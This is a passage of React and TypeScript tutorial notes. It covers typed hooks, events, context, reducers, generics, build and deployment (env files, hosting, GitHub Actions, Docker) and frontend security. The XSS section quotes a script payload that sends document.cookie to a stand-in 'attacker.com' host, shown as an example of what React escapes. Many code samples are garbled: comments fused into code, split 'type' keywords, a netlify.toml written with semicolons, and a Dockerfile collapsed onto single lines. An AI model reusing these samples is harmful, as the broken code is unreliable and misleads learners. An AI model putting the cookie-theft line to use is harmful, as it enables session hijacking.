The useState hook relies heavily on TypeScript's Type Inference engine. If you initialize state with a clean primitive value, TypeScript automatically infers the correct type for you, meaning you don't need to add explicit type definitions.

```tsx
// TypeScript automatically infers this state is a strict 'boolean' typeconst [isOpen, setIsOpen] = useState(false);
```

#### When to Use Explicit Generic Angle Brackets:

If your state starts as null or undefined before loading asynchronously, or if it transitions between distinct object layouts, you must explicitly pass a type argument using generic angle brackets (<...>).

```js
type UserProfile = {
  id: string;
  email: string;
};
function ProfileViewer() {
  // State can explicitly be either the full UserProfile object structural layout OR null
  const [profile, setProfile] = useState<UserProfile | null>(null);

  return <div>{profile ? profile.email : 'Loading Profile Metrics...'}</div>;
}
```

---

### 250. Typing Refs (useRef):

The useRef hook can be typed in two different ways depending on its use case: interacting with native HTML DOM nodes or managing mutable background variable containers.

#### 1. DOM Element Refs (Read-Only Layout Links):

When linking a ref to a live DOM element layout container, pass the precise native browser element type into the generic block, and initialize the value explicitly with null. This creates a read-only ref where React manages the `.current` property dynamically.

```tsx
import { useRef, useEffect } from "react";

function TextFocusInput() {
  // Direct typing targeting the specific HTML element class
  const htmlInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    // TypeScript automatically enforces safe optional chaining checks on current
    htmlInputRef.current?.focus();
  }, []);

  return <input ref={htmlInputRef} type="text" />;
}
```

#### 2. Mutable Instance Containers (Writable Variables):

If you are using a ref to store a background value (like a timer ID or a persistent tracking toggle), initialize the ref with your actual target value. This creates a mutable container where you can freely read and write to `.current`.

```tsx
// Creates a mutable container explicitly typed to hold numbersconst intervalIdRef = useRef<number | null>(null);
const clearTimer = () => {
  if (intervalIdRef.current) {
    clearInterval(intervalIdRef.current);
  }
};
```

---

### 251. Forms & Event Management - Typing React Events:

React handles user actions using its own virtual Synthetic Event Layer to guarantee uniform cross-browser performance. Because of this, you must type inline events using React's specialized semantic event tokens rather than native browser event types.

```tsx
import React, { useState } from "react";

export function CoreInteractionForm() {
  const [inputValue, setInputValue] = useState("");

  // 1. Typing an input field change event handler
  const handleInputChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    setInputValue(event.target.value); // event.target points directly to input properties
  };

  // 2. Typing a standard form submit click wrapper
  const handleFormSubmit = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault(); // Safely blocks native full-page browser reloads
    console.log("Form payload dispatched:", inputValue);
  };

  return (
    <form onSubmit={handleFormSubmit}>
      <input type="text" value={inputValue} onChange={handleInputChange} />
      <button type="submit">Submit Entry</button>
    </form>
  );
}
```

#### Common React Synthetic Event Tokens:

- React.ChangeEvent`<T>`: Used for input fields, checkboxes, textareas, and select elements.
- React.FormEvent`<T>`: Used to capture form submissions.
- React.MouseEvent`<T>`: Used for click actions, hover events, mouse coordinates, and movements.
- React.KeyboardEvent`<T>`: Used to capture keystrokes (onKeyDown, onKeyUp).

---

### 252. State Architecture & Reducers - Typing Context (useContext):

Strongly typing React Context requires an explicit definition block because context must be initialized with a fallback value when created.

```tsx
import { createContext, useContext, useState, ReactNode } from 'react';

// 1. Declare the type structure of the shared context state values type
ThemeContextType = {
  theme: 'light' | 'dark';
  toggleTheme: () => void;
};
// 2. Initialize context with undefined to catch cases where providers are missing
const ThemeContext = createContext<ThemeContextType | undefined>(undefined);
// 3. Create a provider wrapper component
export function ThemeProvider({ children }: { children: ReactNode }) {
  const [theme, setTheme] = useState<'light' | 'dark'>('light');
  const toggleTheme = () => setTheme(prev => prev === 'light' ? 'dark' : 'light');

  return (
    <ThemeContext.Provider value={{ theme, toggleTheme }}>
      {children}
    </ThemeContext.Provider>
  );
}

// 4. Custom validation consumer hook ensuring context is available
export function useTheme() {
  const context = useContext(ThemeContext);
  if (!context) {
    throw new Error("useTheme must be used within an explicit ThemeProvider bounding box.");
  }
  return context;
}
```

---

### 253. Typing Reducers (useReducer):

Typing a useReducer system requires you to define the exact shape of your state object along with a strict type definition for your action payloads. Using a Discriminated Union type for your actions allows TypeScript to automatically determine which payload fields are required based on the action type.

```tsx
import { useReducer } from 'react';
type CounterState = { count: number };

// Discriminated Union pattern for complex state machinestype
CounterAction =
  | { type: 'INCREMENT'; payload: number } // Requires a numeric payload
  | { type: 'DECREMENT'; payload: number } // Requires a numeric payload
  | { type: 'RESET' };                    // No payload allowed

function counterReducer(state: CounterState, action: CounterAction): CounterState {
  switch (action.type) {
    case 'INCREMENT':
      return { count: state.count + action.payload };
    case 'DECREMENT':
      return { count: state.count - action.payload };
    case 'RESET':
      return { count: 0 };
    default:
      return state;
  }
}

export function CounterComponent() {
  const [state, dispatch] = useReducer(counterReducer, { count: 0 });

  return (
    <div>
      <p>Count: {state.count}</p>
      <button onClick={() => dispatch({ type: 'INCREMENT', payload: 5 })}>+5</button>
      <button onClick={() => dispatch({ type: 'RESET' })}>Reset</button>
    </div>
  );
}
```

---

### 254. Generics & Utility Helpers - Generics in React Components:

Generic Components allow you to build highly reusable components that can safely accept varying data shapes while maintaining strict type safety throughout the system (e.g., a reusable dropdown list component that can accept lists of users, products, or links).

```tsx
import React from "react";

type ListProps<T> = {
  items: T[];
  renderItem: (item: T) => React.ReactNode;
};

// Declaring a dynamic Generic mapping component via generic identifier token T
export function CustomList<T>({ items, renderItem }: ListProps<T>) {
  return (
    <div className="list-wrapper">
      {items.map((item, index) => (
        <div key={index} className="list-node">
          {renderItem(item)}
        </div>
      ))}
    </div>
  );
}
// Usage Example:type Car = { make: string; model: string };const carInventory: Car[] = [{ make: 'Tesla', model: 'Model 3' }];

<CustomList
  items={carInventory}
  renderItem={(car) => (
    <span>
      {car.make} - {car.model}
    </span>
  )} // 'car' is automatically inferred as type Car
/>;
```

---

### 255. TypeScript Utility Types in React:

TypeScript provides built-in global utility types that let you quickly transform existing type layouts into new structures, reducing code duplication.

#### 1. ComponentProps:

Extracts the type definitions directly out of an existing component or HTML element wrapper.

```tsx
import { ComponentProps } from 'react';

// Grab every standard attribute type available natively on a standard HTML buttontype
PrimaryButtonProps = ComponentProps<'button'> & {
  variant: 'solid' | 'outline';
};
```

#### 2. Pick and Omit

- Pick: Creates a new type by choosing a specific subset of properties from an existing object type.
- Omit: Creates a new type by selecting all properties from an object type and removing a specified set of keys.

```ts
type ComprehensiveUser = {
  id: string;
  name: string;
  email: string;
  billingAddress: string;
  phoneNumber: string;
};
// Create a lightweight type containing only the id and name fieldstype SimpleUserView = Pick<ComprehensiveUser, 'id' | 'name'>;
// Create a type containing everything except the sensitive billing and phone fieldstype PublicUserView = Omit<ComprehensiveUser, 'billingAddress' | 'phoneNumber'>;
```

---

### 256. Strict Mode Verification:

Enabling TypeScript's "strict": true flag inside your configuration profile (tsconfig.json) turns on a suite of comprehensive code checks that ensure a higher level of type safety across your codebase.

- noImplicitAny: Blocks the compiler from automatically converting a variable to an unsafe any type when you forget to declare an explicit type.
- strictNullChecks: Forces you to explicitly handle null and undefined edge cases, eliminating "Cannot read property of undefined" errors at runtime.

---

## 26. <u> Build & Deployment </u> -

### 257. Compilation & Build Optimization - Production Builds:

When developing a React application locally, your dev server prioritizes debugging features: it tracks detailed component histories, logs helpful warnings, retains expansive source maps, and hot-swaps modules in place. However, this code is unoptimized and heavy.

When you execute a production build command (e.g., `npm run build`), your builder—typically powered by modern bundlers like Vite, esbuild, Rollup, or Webpack—completely transforms your codebase into a streamlined, static distribution folder (typically named /dist or /build).

During this compilation process, several production-only steps occur:

- Dead Code Elimination (Tree Shaking): The compiler analyzes your imports statically. If you imported an entire utility library but only used one specific function, the unused functions are completely deleted from the final output code.
- Minification: Variable names are shortened to single characters, comments are stripped, and whitespace is deleted to shrink the final file size.
- Code Splitting & Chunking: Page routes and heavy utilities are divided into separate physical files (.js and .css chunks) so the browser only downloads the specific code it needs on-demand.
- **Cache Busting Content Hashes**: Output files are appended with unique cryptographic string hashes based on their contents (e.g., `index-a4b2c8.js`). When you redeploy your app, files that didn't change retain their filenames, allowing client browsers to load them instantly from cache. Files with updated code receive new hashes, forcing browsers to download the fresh updates.

---

### 258. Environment Variables & .env Files:

React applications run entirely inside the end-user's browser. Because of this, you cannot use environment variables to store secure, private credentials (like private database passwords or encryption keys). Anyone can open their browser's developer console, look at the network tab, or inspect your source code bundle to extract those values.

Instead, environment variables in React are used to toggle public configuration profiles based on your current deployment stage (e.g., pointing local development builds to a localhost API vs. pointing production builds to a secure production domain).

#### The Build Tool Prefixes:

To protect you from accidentally leaking computer environment secrets into your public bundle, modern build tools ignore generic environment variables. They will only inject variables explicitly prefixed with a specific build-tool key.

| Build Tool       | Required Prefix | Code Access In Injection        |
| ---------------- | --------------- | ------------------------------- |
| Vite             | VITE\_          | import.meta.env.VITE_API_URL    |
| Next.js          | NEXT*PUBLIC*    | process.env.NEXT_PUBLIC_API_URL |
| Create React App | REACT*APP*      | process.env.REACT_APP_API_URL   |

#### Storing Variables Safely:

You manage these configurations using separate root-level .env files. The build runner reads these files and replaces the matching code tokens with literal string values during compilation.

```js
.env.development  <- Loaded automatically during local coding (npm run dev)
VITE_API_URL=http://localhost:5000/api

.env.production   <- Loaded automatically during production compilation (npm run build)
VITE_API_URL=https://productiondomain.com
```

---

### 259. Infrastructure & Hosting Environments - Static Hosting Architecture:

Because a production-compiled React application consists entirely of static client-side files (HTML, CSS, JavaScript, images), it does not require a continuous, active Node.js server engine to run at runtime. It can be hosted on Static Hosting Infrastructure, which serves pre-built assets directly to users over a globally distributed `Content Delivery Network` (CDN).

When a user requests your site, the nearest CDN edge node serves the main `index.html` file instantly. The client's browser then downloads, parses, and executes the attached JavaScript bundles to draw the UI right on their screen.

#### Major Hosting Platforms Compared:

##### Vercel:

- The Architecture: The native ecosystem designed by the creators of **Next.js**, optimized for frontend performance.
- Best Features: Instant zero-configuration deployments directly from your Git branches, automatic generation of preview URLs for every pull request, and built-in edge networking optimizations.

##### Netlify

- The Architecture: A pioneering platform for modern Jamstack applications.
- Best Features: Excellent form-handling capture utilities, continuous integration pipelines, simple redirects management, and edge-native serverless function deployments.

##### Firebase Hosting:

- The Architecture: Backed by **Google's cloud** infrastructure.
- Best Features: Seamlessly integrates with the broader Firebase backend ecosystem (Firestore, Authentication, Cloud Storage). Highly secure, offering built-in SSL configuration out of the box. [33, 34, 35, 36, 37]

---

### 260. The SPA Client Router Trapping Catch:

When deploying a single-page application using client-side routing (like React Router) to a static hosting platform, refreshing the browser on an internal path (like /dashboard/settings) will trigger a standard server 404 Not Found error.

- Why it happens: The static web server looks for a literal physical folder or file at the path /dashboard/settings/index.html on its hard drive, which doesn't exist.
- The Fix: You must configure your platform to redirect all incoming traffic back to your root /index.html file. This allows React Router to intercept the URL path and render the correct internal page view smoothly.

```js
// Example: netlify.toml configuration file override
[[redirects]];
from = "/*";
status = 200;
to = "/index.html";
```

---

### 261. Continuous Integration & Automation - CI/CD Basics:

- Continuous Integration (CI): The automated pipeline that runs every time a developer pushes code to a shared repository. It builds the code, runs the test suite, and checks linters to catch errors before code is merged.
- Continuous Deployment (CD): The automated pipeline that picks up code once it passes the CI check, compiles the official production build, and uploads the updated static assets to your live production hosting platform automatically.

#### GitHub Actions Workflow:

GitHub Actions uses `YAML` configuration files tucked inside your project's .github/workflows/ directory to automate your deployment pipelines.

```js
name: Build and Deploy Production Web Application
on:
  push:
    branches: [ main ] # Trigger this pipeline automatically when code pushes to main
jobs:
  verify-and-deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Source Code Repository
        uses: actions/checkout@v4

      - name: Initialize Node.js Environment
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'

      - name: Install Project Dependencies
        run: npm ci # Performs a clean, deterministic install based on package-lock.json

      - name: Run Test Suites
        run: npm run test:ci

      - name: Compile Optimized Production Build
        run: npm run build
        env:
          VITE_API_URL: ${{ secrets.PRODUCTION_API_URL }} # Injects encrypted secrets securely

      - name: Deploy Compiled Distribution to Vercel
        uses: amondnet/vercel-action@v25
        with:
          vercel-token: ${{ secrets.VERCEL_TOKEN }}
          vercel-org-id: ${{ secrets.ORG_ID }}
          vercel-project-id: ${{ secrets.PROJECT_ID }}
          vercel-args: '--prod'
```

---

### 262. Advanced Containment & Release Strategies - Docker Basics for React:

While static hosting platforms are standard, enterprise internal infrastructures or Kubernetes environments often require packaging applications inside isolated Docker containers.

To serve a client-facing React application using Docker, use a Multi-Stage Build. Stage one initializes a heavy Node.js environment to install dependencies and compile your static production build folder. Stage two throws away that heavy Node.js layer and transfers only the compiled static assets into a lightweight, secure web server like Nginx to serve the site.

- --- STAGE 1: Build Environment ---FROM node:20-alpine AS build-engineWORKDIR /appCOPY package\*.json ./RUN npm ciCOPY . .RUN npm run build

- --- STAGE 2: Production Server Execution ---FROM nginx:alpine# Copy the compiled production assets from Stage 1 directly to Nginx's public folderCOPY --from=build-engine /app/dist /usr/share/nginx/html# Copy custom Nginx routing rules to handle the SPA 404 client-routing fallbackCOPY nginx.conf /etc/nginx/conf.d/default.confEXPOSE 80CMD ["nginx", "-g", "daemon off;"]

#### Deployment Strategies:

To minimize the risk of introducing bugs to production, teams use advanced deployment strategies to safely roll out new versions of an application.

#### Blue-Green Deployments:

This strategy maintains two identical production hosting environments: one live environment currently serving production traffic ("Blue") and one idle environment where you deploy the new update ("Green").

Once your team runs final verification tests on the Green environment and confirms it works perfectly, you flip your global router switch to instantly redirect all incoming user traffic to the Green environment. The old Blue environment stays idle for a short period, allowing you to instantly roll back traffic if any critical bugs show up.

```
[ Incoming User Traffic ]
           |
           v
   [ Global Router Switch ]
      /               \
     v                 v
[ Blue Env ]      [ Green Env ]
 (Old Live)       (New Deploy)
```

#### Canary Releases:

A canary release gradually rolls out your new application version to a small, isolated percentage of your real user base (e.g., routing 5% of traffic to the new version while the other 95% stays on the stable version).

Your team monitors performance metrics, error rates, and automated logs from this small test group. If everything runs smoothly over a set timeframe, you scale the distribution upward until 100% of your user base is safely running the new version.

---

## 27. <u> Security </u> -

### 263. Injection & Network Vectors - XSS (Cross-Site Scripting) Prevention:

Cross-Site Scripting (XSS) occurs when an attacker successfully injects a malicious script file or executable payload into your web application, which then executes inside another user's browser session. If executed, an XSS payload can steal authentication cookies, extract active session tokens from localStorage, or masquerade as the user to make unauthorized transactions.

#### How React Protects You by Default:

By default, React automatically escapes all values rendered inside your JSX templates before displaying them on the screen. It converts text strings into safe, non-executable text literals before compiling them into DOM nodes.

```js
// If userInputValue is: <script>fetch('http://attacker.com' + document.cookie)</script>
// React automatically escapes it into safe characters: &lt;script&gt;fetch...
<div>{userInputValue}</div>
```

#### The Escape Hatches (And How to Secure Them):

If your application must display raw HTML rich text (such as blog content generated by a WYSIWYG editor), you have to bypass React's built-in escaping using the explicitly named `property: dangerouslySetInnerHTML`.

```js
// Dangerous Anti-pattern: Renders raw unescaped HTML directly to the browser
<div dangerouslySetInnerHTML={{ __html: dynamicUserContent }} />
```

To use this property securely, you must run all raw HTML inputs through a Sanitization Library like dompurify before rendering. Sanitization strips out dangerous elements like `<script>`, onerror, and javascript: URIs while keeping safe presentation markup (like `<b>`, `<i>`, and `<p>`) intact.

```js
import DOMPurify from "dompurify";

function SafeHtmlViewer({ dynamicUserContent }) {
  // Cleans the HTML string before passing it to the component
  const cleanHtml = DOMPurify.sanitize(dynamicUserContent);

  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

---

### 264. CSRF (Cross-Site Request Forgery) Concepts:

Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user's browser to execute an unwanted action on a trusted web server.

- The Vector: If your API stores session tokens inside standard browser cookies, the browser automatically attaches those cookies to every outgoing request to that API domain—even if the request is triggered by a malicious script running on an entirely different website.
- The React Context: Because React is a client-side library, it cannot prevent CSRF on its own; defense must be established at the API level.

#### Modern Anti-CSRF Mitigations:

1.  SameSite Cookie Attribute: Configure your API server to issue authentication cookies with SameSite=Strict or SameSite=Lax. This instructs the browser to never attach the authentication cookie to cross-site requests, blocking CSRF attacks at the browser level.
2.  Anti-CSRF Tokens: The server generates a unique, single-use token and embeds it within a custom layout header or HTML meta tag. The React frontend reads this token and returns it inside a custom HTTP header (e.g., X-CSRF-TOKEN) with every data mutation request (POST, PUT, DELETE). The server verifies this token before processing the request, ensuring the action originated from your legitimate frontend app.

---

### 265. Token & Secrets Management - Environment Variable Security:

As covered in deployment architectures, React environment variables are not secure.
Because your compiled JavaScript bundles are downloaded and executed entirely inside the user's browser, any variable injected at build time (e.g., values prefixed with VITE* or REACT_APP*) is visible to the public.

#### Best Practices for Handling Sensitive Configurations

- Never store private credentials (like database passwords, private encryption keys, or third-party payment secret tokens) in your frontend configuration files.
- Use frontend environment variables exclusively for public-facing settings, such as toggling between local and production API URLs (VITE_API_URL).
- The Gateway Pattern: If a feature requires a secret API key to communicate with a third-party service, route the request through your own backend server or an isolated serverless function first. Your backend securely attaches the secret key before forwarding the request to the third-party service, keeping the credential safely hidden from the client side.

---

### 266. Authentication Tokens (Storage & Security):

Once a user logs into your single-page application, the backend issues an authentication token—typically a JSON Web Token (JWT)—to authenticate subsequent API requests. Where you store this token on the client side directly impacts your application's security.

#### 1. LocalStorage / SessionStorage:

- Pros: Highly convenient and simple to implement. You can read the token synchronously using JavaScript and attach it directly to your API client's request headers.
- Cons: Vulnerable to XSS. If an attacker successfully executes a malicious script on your site via an XSS vulnerability, they can read all tokens stored in localStorage instantly using a single line of JavaScript code (localStorage.getItem('token')).

#### 2. In-Memory State with httpOnly Refresh Cookies (The Production Standard):

To balance convenience with security, modern architectures use a split-token approach:

- The Access Token: Store a short-lived access token (e.g., valid for 15 minutes) directly in your application's local JavaScript memory state (such as a standard React Context or Redux store variable). Because it lives in memory, it cannot be accessed via persistent localStorage lookups.
- The Refresh Token: Store a long-lived refresh token inside a secure cookie issued with the httpOnly and Secure flags. The httpOnly flag blocks client-side JavaScript from reading or modifying the cookie, completely protecting it from XSS extraction.
- The Lifecycle: When the in-memory access token expires, your React app makes a background call to a /refresh API endpoint. The browser automatically attaches the secure refresh cookie, and the server returns a fresh access token to your application state, maintaining a seamless user experience.

#### 3. Access Control & API Communications - Secure API Calls:

Securing communications between your frontend React application and backend APIs requires enforcing encrypted channels and defensive coding practices:

- Enforce HTTPS Everywhere: Ensure all API endpoints use strict TLS encryption (https://) to prevent man-in-the-middle (MITM) attacks from eavesdropping on your network requests.
- Validate API Payloads: Treat all incoming API data as untrusted. Run incoming network data structures through light parsing schemas (using validation tools like Zod) before passing them down to your component state to prevent malformed properties from breaking your UI.

---

### 267. Authorization & Secure Routing:

Authentication verifies who a user is, while Authorization verifies what they are allowed to do. In a React application, client-side routing guards provide visual access control but do not act as true system security.

#### Implementing a Client-Side Route Guard:

To secure client-side navigation, use a structural higher-order route wrapper that checks a user's role permissions before rendering protected components.

```jsx
import { Navigate, Outlet } from 'react-router-dom';

type ProtectedRouteProps = {
  userRole: 'admin' | 'editor' | 'guest';
  allowedRoles: ('admin' | 'editor')[];
};
export function AccessControlGuard({ userRole, allowedRoles }: ProtectedRouteProps) {
  // Check if the user's role is permitted to view this route
  const isAuthorized = allowedRoles.includes(userRole);

  if (!isAuthorized) {
    // Redirect unauthorized users to an access-denied fallback route
    return <Navigate to="/unauthorized" replace />;
  }

  // Render the protected nested route components
  return <Outlet />;
}
```

#### The Ultimate Rule of Frontend Security:

Client-side security is purely for user experience, not true data defense.
An attacker can use browser developer tools to modify your local React state variables, disable route guards, or alter your user role flags from guest to admin to force hidden components onto the screen. Therefore, true authorization must always be enforced on the backend server. Every API endpoint must re-verify the user's authentication token and confirm their permissions before returning sensitive data or executing mutations, regardless of what the frontend UI displays.

---

### 268. Supply Chain Security - Dependency Vulnerabilities:

Modern React applications rely heavily on a vast ecosystem of third-party node packages. This introduces supply chain risks, where a vulnerability buried deep within an open-source dependency can compromise your entire production environment.

#### Strategies for Securing the Dependency Chain:

- Run Automated Audits: Integrate vulnerability scanning into your development and CI/CD workflows using built-in package utilities:

```js
npm audit # Scans dependency trees for known security vulnerabilities
npm audit fix # Automatically updates vulnerable nested packages to safe patches
```

- Use Specialized Security Tools: For enterprise environments, integrate specialized platform scanners like Snyk, GitHub Dependabot, or Socket. These tools monitor your repository automatically, tracking newly disclosed CVE vulnerabilities and opening automated Pull Requests to bump package versions safely.
- Minimize Dependency Bloat: Regularly review your package.json file and prune unused dependencies. Fewer dependencies mean a smaller attack surface for supply chain threats.

---
